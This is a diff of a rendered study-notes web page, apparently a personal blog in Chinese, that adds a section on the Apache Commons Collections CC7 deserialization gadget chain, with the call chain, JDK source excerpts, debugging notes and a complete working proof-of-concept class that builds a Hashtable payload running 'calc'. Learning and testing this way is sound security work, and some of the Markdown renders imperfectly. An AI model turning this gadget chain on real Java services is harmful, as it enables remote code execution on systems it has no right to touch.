@@ -6530,8 +6530,230 @@
    实战中，JBoss CVE-2017-12149 的利用就推荐使用CC5</li>
 </ol>
 <h3 id="cc7">CC7链<a class="headerlink" href="#cc7" title="Permanent link">&para;</a></h3>
+<ol>
+<li>扫除前障</li>
+<li>装饰器模式的结构模型和方法调用</li>
+<li>结构模型<img alt="" src="2026-05-18-22-07-45.png" /></li>
+<li>super(map) 让父类的 map 字段等于了 LazyMap 内层的那个普通 Map，所以 LazyMap.equals() 实际上是由这个内层 Map 去执行的</li>
+<li>设计意图：装饰器模式（Decorator Pattern）的特点——装饰类（LazyMap）把核心操作委托给被装饰的对象（内层Map），自己只负责添加额外功能（懒加载）</li>
+<li>哈希表中的桶【一句话：桶就是哈希表数组中的一个位置，用来存放哈希值相同的多个键值对。】</li>
+<li>什么是桶：哈希表（如 Hashtable、HashMap）内部有一个数组，这个数组的每个位置就叫做一个桶（Bucket）。 </li>
+<li>桶的作用：用来存放哈希值相同的entry
+     不同的 key 可能计算出相同的哈希值（哈希冲突）
+     所有哈希值相同的 Entry，都放在同一个桶里
+     桶里用链表把多个 Entry 串起来</li>
+<li>图解：桶和链表的关系<img alt="" src="2026-05-18-23-47-19.png" /> </li>
+<li>为什么要让两个LazyMap的 hashCode 相等
+  为了让 Hashtable 在反序列化时把它们放在同一个哈希桶里，从而触发 equals 比较，进而执行攻击链。 </li>
+<li>为什么选 "yy" 和 "zZ"作为lazyMap的键？
+  Hashtable 不允许重复的 key。这两个字符串的 hashCode 恰好相等，让两个LazyMap的key分别等于这两个字符串值都等于1就可以让两个LazyMap的hashcode相等 </li>
+<li>调用链
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-166-1"><a id="__codelineno-166-1" name="__codelineno-166-1" href="#__codelineno-166-1"></a>Hashtable.readObject()
+</span><span id="__span-166-2"><a id="__codelineno-166-2" name="__codelineno-166-2" href="#__codelineno-166-2"></a>|
+</span><span id="__span-166-3"><a id="__codelineno-166-3" name="__codelineno-166-3" href="#__codelineno-166-3"></a>Hashtable.reconstitutionPut()
+</span><span id="__span-166-4"><a id="__codelineno-166-4" name="__codelineno-166-4" href="#__codelineno-166-4"></a>   |
+</span><span id="__span-166-5"><a id="__codelineno-166-5" name="__codelineno-166-5" href="#__codelineno-166-5"></a>   e.key.equals(key)                //LazyMap.equals()
+</span><span id="__span-166-6"><a id="__codelineno-166-6" name="__codelineno-166-6" href="#__codelineno-166-6"></a>   |
+</span><span id="__span-166-7"><a id="__codelineno-166-7" name="__codelineno-166-7" href="#__codelineno-166-7"></a>   AbstractMapDecorator.equals()   // LazyMap父类的方法
+</span><span id="__span-166-8"><a id="__codelineno-166-8" name="__codelineno-166-8" href="#__codelineno-166-8"></a>      |
+</span><span id="__span-166-9"><a id="__codelineno-166-9" name="__codelineno-166-9" href="#__codelineno-166-9"></a>      HashMap.equals()              
+</span><span id="__span-166-10"><a id="__codelineno-166-10" name="__codelineno-166-10" href="#__codelineno-166-10"></a>      |
+</span><span id="__span-166-11"><a id="__codelineno-166-11" name="__codelineno-166-11" href="#__codelineno-166-11"></a>      AbstractMap.equals()         // 实际触发点
+</span><span id="__span-166-12"><a id="__codelineno-166-12" name="__codelineno-166-12" href="#__codelineno-166-12"></a>         |
+</span><span id="__span-166-13"><a id="__codelineno-166-13" name="__codelineno-166-13" href="#__codelineno-166-13"></a>         LazyMap.get()              
+</span><span id="__span-166-14"><a id="__codelineno-166-14" name="__codelineno-166-14" href="#__codelineno-166-14"></a>            |
+</span><span id="__span-166-15"><a id="__codelineno-166-15" name="__codelineno-166-15" href="#__codelineno-166-15"></a>            ChainedTransformer.transform()
+</span><span id="__span-166-16"><a id="__codelineno-166-16" name="__codelineno-166-16" href="#__codelineno-166-16"></a>               |
+</span><span id="__span-166-17"><a id="__codelineno-166-17" name="__codelineno-166-17" href="#__codelineno-166-17"></a>               ConstantTransformer.transform()
+</span><span id="__span-166-18"><a id="__codelineno-166-18" name="__codelineno-166-18" href="#__codelineno-166-18"></a>               |
+</span><span id="__span-166-19"><a id="__codelineno-166-19" name="__codelineno-166-19" href="#__codelineno-166-19"></a>               InvokerTransformer.transform()
+</span></code></pre></div></li>
+<li>关键类源码</li>
+<li>Hashtable.readObject()
+  <div class="language-java highlight"><pre><span></span><code><span id="__span-167-1"><a id="__codelineno-167-1" name="__codelineno-167-1" href="#__codelineno-167-1"></a><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream</span><span class="w"> </span><span class="n">s</span><span class="p">)</span>
+</span><span id="__span-167-2"><a id="__codelineno-167-2" name="__codelineno-167-2" href="#__codelineno-167-2"></a><span class="w">   </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-167-3"><a id="__codelineno-167-3" name="__codelineno-167-3" href="#__codelineno-167-3"></a><span class="w">   </span><span class="c1">// ...</span>
+</span><span id="__span-167-4"><a id="__codelineno-167-4" name="__codelineno-167-4" href="#__codelineno-167-4"></a><span class="k">for</span><span class="w"> </span><span class="p">(;</span><span class="w"> </span><span class="n">elements</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">elements</span><span class="o">--</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-167-5"><a id="__codelineno-167-5" name="__codelineno-167-5" href="#__codelineno-167-5"></a><span class="w">            </span><span class="nd">@SuppressWarnings</span><span class="p">(</span><span class="s">&quot;unchecked&quot;</span><span class="p">)</span>
+</span><span id="__span-167-6"><a id="__codelineno-167-6" name="__codelineno-167-6" href="#__codelineno-167-6"></a><span class="w">               </span><span class="n">K</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">K</span><span class="p">)</span><span class="n">s</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+</span><span id="__span-167-7"><a id="__codelineno-167-7" name="__codelineno-167-7" href="#__codelineno-167-7"></a><span class="w">            </span><span class="nd">@SuppressWarnings</span><span class="p">(</span><span class="s">&quot;unchecked&quot;</span><span class="p">)</span>
+</span><span id="__span-167-8"><a id="__codelineno-167-8" name="__codelineno-167-8" href="#__codelineno-167-8"></a><span class="w">               </span><span class="n">V</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">V</span><span class="p">)</span><span class="n">s</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+</span><span id="__span-167-9"><a id="__codelineno-167-9" name="__codelineno-167-9" href="#__codelineno-167-9"></a><span class="w">            </span><span class="n">reconstitutionPut</span><span class="p">(</span><span class="n">table</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="c1">//关键调用</span>
+</span><span id="__span-167-10"><a id="__codelineno-167-10" name="__codelineno-167-10" href="#__codelineno-167-10"></a><span class="w">      </span><span class="p">}</span>
+</span><span id="__span-167-11"><a id="__codelineno-167-11" name="__codelineno-167-11" href="#__codelineno-167-11"></a><span class="w">   </span><span class="p">}</span>
+</span></code></pre></div>
+  反序列化时会用到reconstitutionPut方法</li>
+<li>reconstitutionPut()
+  <div class="language-java highlight"><pre><span></span><code><span id="__span-168-1"><a id="__codelineno-168-1" name="__codelineno-168-1" href="#__codelineno-168-1"></a><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">reconstitutionPut</span><span class="p">(</span><span class="n">Entry</span><span class="o">&lt;?</span><span class="p">,</span><span class="o">?&gt;[]</span><span class="w"> </span><span class="n">tab</span><span class="p">,</span><span class="w"> </span><span class="n">K</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">V</span><span class="w"> </span><span class="n">value</span><span class="p">)</span>
+</span><span id="__span-168-2"><a id="__codelineno-168-2" name="__codelineno-168-2" href="#__codelineno-168-2"></a><span class="w">      </span><span class="kd">throws</span><span class="w"> </span><span class="n">StreamCorruptedException</span>
+</span><span id="__span-168-3"><a id="__codelineno-168-3" name="__codelineno-168-3" href="#__codelineno-168-3"></a><span class="w">   </span><span class="p">{</span>
+</span><span id="__span-168-4"><a id="__codelineno-168-4" name="__codelineno-168-4" href="#__codelineno-168-4"></a><span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-168-5"><a id="__codelineno-168-5" name="__codelineno-168-5" href="#__codelineno-168-5"></a><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">StreamCorruptedException</span><span class="p">();</span>
+</span><span id="__span-168-6"><a id="__codelineno-168-6" name="__codelineno-168-6" href="#__codelineno-168-6"></a><span class="w">      </span><span class="p">}</span>
+</span><span id="__span-168-7"><a id="__codelineno-168-7" name="__codelineno-168-7" href="#__codelineno-168-7"></a><span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">key</span><span class="p">.</span><span class="na">hashCode</span><span class="p">();</span>
+</span><span id="__span-168-8"><a id="__codelineno-168-8" name="__codelineno-168-8" href="#__codelineno-168-8"></a><span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">hash</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0x7FFFFFFF</span><span class="p">)</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">tab</span><span class="p">.</span><span class="na">length</span><span class="p">;</span>
+</span><span id="__span-168-9"><a id="__codelineno-168-9" name="__codelineno-168-9" href="#__codelineno-168-9"></a><span class="w">      </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Entry</span><span class="o">&lt;?</span><span class="p">,</span><span class="o">?&gt;</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tab</span><span class="o">[</span><span class="n">index</span><span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">next</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-168-10"><a id="__codelineno-168-10" name="__codelineno-168-10" href="#__codelineno-168-10"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">e</span><span class="p">.</span><span class="na">hash</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">hash</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">key</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">key</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-168-11"><a id="__codelineno-168-11" name="__codelineno-168-11" href="#__codelineno-168-11"></a><span class="w">               </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">StreamCorruptedException</span><span class="p">();</span>
+</span><span id="__span-168-12"><a id="__codelineno-168-12" name="__codelineno-168-12" href="#__codelineno-168-12"></a><span class="w">            </span><span class="p">}</span>
+</span><span id="__span-168-13"><a id="__codelineno-168-13" name="__codelineno-168-13" href="#__codelineno-168-13"></a><span class="w">      </span><span class="p">}</span>
+</span><span id="__span-168-14"><a id="__codelineno-168-14" name="__codelineno-168-14" href="#__codelineno-168-14"></a><span class="w">   </span><span class="p">}</span>
+</span></code></pre></div>
+  如果两个key的hashcode相同就会执行e.key.equals(key)，攻击者可以控制e.key=LazyMap1，key=LazyMap2，LazyMap没有equals方法所以会调用父类的，即AbstractMappDecorator.equals(LazyMap2)  </li>
+<li>AbstractMappDecorator.equals()
+  <div class="language-java highlight"><pre><span></span><code><span id="__span-169-1"><a id="__codelineno-169-1" name="__codelineno-169-1" href="#__codelineno-169-1"></a><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">equals</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//参数参入的是key2</span>
+</span><span id="__span-169-2"><a id="__codelineno-169-2" name="__codelineno-169-2" href="#__codelineno-169-2"></a><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">object</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="k">this</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-169-3"><a id="__codelineno-169-3" name="__codelineno-169-3" href="#__codelineno-169-3"></a><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+</span><span id="__span-169-4"><a id="__codelineno-169-4" name="__codelineno-169-4" href="#__codelineno-169-4"></a><span class="w">   </span><span class="p">}</span>
+</span><span id="__span-169-5"><a id="__codelineno-169-5" name="__codelineno-169-5" href="#__codelineno-169-5"></a><span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="n">map</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">object</span><span class="p">);</span><span class="w">         </span>
+</span><span id="__span-169-6"><a id="__codelineno-169-6" name="__codelineno-169-6" href="#__codelineno-169-6"></a><span class="p">}</span>
+</span></code></pre></div>
+  此时map的类型为HashMap，HashMap没有equals方法，会调用父类的，即AbstractMap.equals(LazyMap2)</li>
+<li>AbstractMap.equals()
+  ```java
+  public boolean equals(Object o) {
+        if (o == this)
+              return true;<div class="language-text highlight"><pre><span></span><code>if (!(o instanceof Map))
+      return false;
+Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;
+if (m.size() != size())
+      return false;
+
+try {
+      Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
+      while (i.hasNext()) {
+         Entry&lt;K,V&gt; e = i.next();
+         K key = e.getKey();
+         V value = e.getValue();
+         if (value == null) {
+            if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))
+                  return false; // 触发LazyMap.get()
+         } else {
+            if (!value.equals(m.get(key))) // 二次触发点
+                  return false;
+         }
+      }
+} catch (ClassCastException unused) {
+      return false;
+} catch (NullPointerException unused) {
+      return false;
+}
+
+return true;
+</code></pre></div>
+<p>}
+      <code>遍历LazyMap1的entrySet与LazyMap2的entry比较，会触发m.get(key)，即LazyMap.get()
+4. 手工POC
+   1. 构造的关键点
+      1. 要让LazyMap1和LazyMap2的hashcode相等
+      2. 在Hashtable中放入LazyMap1和LazyMap2这两个key之前要把LazyMap2的factory设为无害的然后再用反射修改为ChainedTransformer，放入Hashtable之后要remove清除LazyMap2中的键值对缓存
+ 因为Hashtable的put方法会和reconstitutionPut方法有一样的调用导致调用链在构造阶段（攻击者本地） 就会被提前触发同时回事LazyMap2中出现关于LazyMap1中的key的键值对缓存导致反序列化时LazyMap.get()直接返回缓存的value而不是执行factory.transform()导致调用链无法触发
+   2. 验证poc发现并没有执行弹出计算器的命令![](java-deserialization(ing)/2026-05-19-03-06-25.png)
+      1. 因为我想当然的以为反序列化时是按照我设想的m1.equals(m2)所以只把m2的factory设为恶意ChainedTransformer，没有吧m1也设置。但实际上可能是 m1.equals(m2)，也可能是 m2.equals(m1)这取决于迭代顺序（不确定）。所有要把两个LazyMap的factory都设置为ChainedTransformer
+      2. 我在创建ChainedTransformer对象时直接把恶意链放入其中` ChainedTransformer ctChain = new ChainedTransformer(new Transformer[]{ct,it,it2,it3});`
+      3. 调试查看哪里出了问题
+ 1. 关键位置打上断点
+ 2. 发现问题：当运行到`map2.put("zZ", 1);`时会触发问题![](java-deserialization(ing)/2026-05-19-09-22-35.png)
+ 3. 当运行到开始反序列化时我突然发现Hashtable中只有m1一个元素，为什么m2没有被放入![](java-deserialization(ing)/2026-05-19-09-44-10.png)
+ 4. 在Hashtable.put()中加断点![](java-deserialization(ing)/2026-05-19-09-53-07.png)
+ 5. 在AbstractMap.equals()中加断点观察是否返回true![](java-deserialization(ing)/2026-05-19-10-00-46.png)
+ 6. 发现确实跳转到true了这也就是为什么Hashtable中只有m1一个元素了![](java-deserialization(ing)/2026-05-19-10-02-25.png)
+ 7. 我把factory设为ConstantTransformer(1)当m2.get("yy")时发现没有这个key就调用factory.transform("yy")获取value但巧合的是factory是ConstantTransformer(1)会让m2中yy对于的值恰好是1等于m1中yy的value【1】，返回true从而导致不会把m2加入到Hashtable中
+ 8. 为了验证是否是我猜想的巧合导致的，我把m2初始的factory设为2![](java-deserialization(ing)/2026-05-19-10-08-47.png)发现成功弹出计算器证明猜想正确
+ 9. 改进为了防止再出现这种问题，直接初始时使用空的 Transformer 数组</code>java
+    // 初始时使用空的 Transformer 数组
+    Transformer[] transformers = new Transformer[]{};
+    ChainedTransformer ctChain = new ChainedTransformer(transformers);
+
+    // ... 创建 LazyMap 时使用空的 ctChain
+    Map m1 = LazyMap.decorate(map1, ctChain);
+    Map m2 = LazyMap.decorate(map2, ctChain);
+
+    // ... 放入 Hashtable
+
+    // 序列化前才反射替换为真正的恶意链
+    ctChain = new ChainedTransformer(new Transformer[]{ct,it,it2,it3});          <br />
+<code>3. 完整POC</code>java
+      import org.apache.commons.collections.Transformer;
+      import org.apache.commons.collections.functors.ChainedTransformer;
+      import org.apache.commons.collections.functors.ConstantTransformer;
+      import org.apache.commons.collections.functors.InvokerTransformer;
+      import org.apache.commons.collections.map.LazyMap;
+      import java.io.*;
+      import java.lang.reflect.Field;
+      import java.util.HashMap;
+      import java.util.Hashtable;
+      import java.util.Map;
+
+      public class CC7 {
+         public static void main(String[] args) throws Exception {
+            ConstantTransformer ct = new ConstantTransformer(Runtime.class);
+            InvokerTransformer it = new InvokerTransformer("getMethod",
+                  new Class[]{String.class,Class[].class},
+                  new Object[]{"getRuntime",new Class[0]}
+            );
+            InvokerTransformer it2 = new InvokerTransformer(
+                  "invoke",
+                  new Class[]{Object.class,Object[].class},
+                  new Object[]{null,new Object[0]}
+            );
+            InvokerTransformer it3 = new InvokerTransformer(
+                  "exec",
+                  new Class[]{String.class},
+                  new Object[]{"calc"}
+            );
+            Transformer[] transformers = new Transformer[]{};
+               ChainedTransformer ctChain = new ChainedTransformer(transformers);
+
+
+               HashMap map1 = new HashMap();
+               HashMap map2 = new HashMap();
+               map1.put("yy", 1);
+               map2.put("zZ", 1);
+
+
+                  Map m1 = LazyMap.decorate(map1, ctChain);
+                  Map m2 = LazyMap.decorate(map2, ctChain);
+
+                  Hashtable ht = new Hashtable();
+                  ht.put(m1, 1);
+                  ht.put(m2, 1);
+
+
+                  ctChain= new ChainedTransformer(new Transformer[]{ct,it,it2,it3});
+                  Field f = LazyMap.class.getDeclaredField("factory");
+                  f.setAccessible(true);
+                  f.set(m2, ctChain);
+                  f.set(m1, ctChain);
+
+
+                  m2.remove("yy");
+
+
+                  ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                  ObjectOutputStream oos = new ObjectOutputStream(baos);
+                  oos.writeObject(ht);
+                  oos.flush();
+                  byte[] bytes = baos.toByteArray();
+                  oos.close();
+                  System.out.println("Payload serialized successfully!");
+
+
+                  ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
+                  ObjectInputStream ois = new ObjectInputStream(bais);
+                  ois.readObject();
+                  ois.close();
+                  System.out.println("Payload executed successfully!");
+         }
+      }
+
+      ```
+5. ysoserial验证
+6. CC7的优势</p>
 <h3 id="cc3">CC3链<a class="headerlink" href="#cc3" title="Permanent link">&para;</a></h3>
 <p><img alt="" src="2026-05-17-10-06-36.png" /></p>
+</li>
+</ol>
 </li>
 </ol>
 
@@ -6556,7 +6778,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="May 17, 2026 13:20:01 UTC"><span class="timeago" datetime="2026-05-17T13:20:01+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="May 17, 2026 13:20:01 UTC">2026-05-17</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="May 19, 2026 02:12:53 UTC"><span class="timeago" datetime="2026-05-19T02:12:53+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="May 19, 2026 02:12:53 UTC">2026-05-19</span>
   </span>
 
     
@@ -6566,7 +6788,7 @@
     <span class="md-icon" title="Created">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="May 17, 2026 13:20:01 UTC"><span class="timeago" datetime="2026-05-17T13:20:01+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="May 17, 2026 13:20:01 UTC">2026-05-17</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="May 19, 2026 02:12:53 UTC"><span class="timeago" datetime="2026-05-19T02:12:53+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="May 19, 2026 02:12:53 UTC">2026-05-19</span>
   </span>
 
     
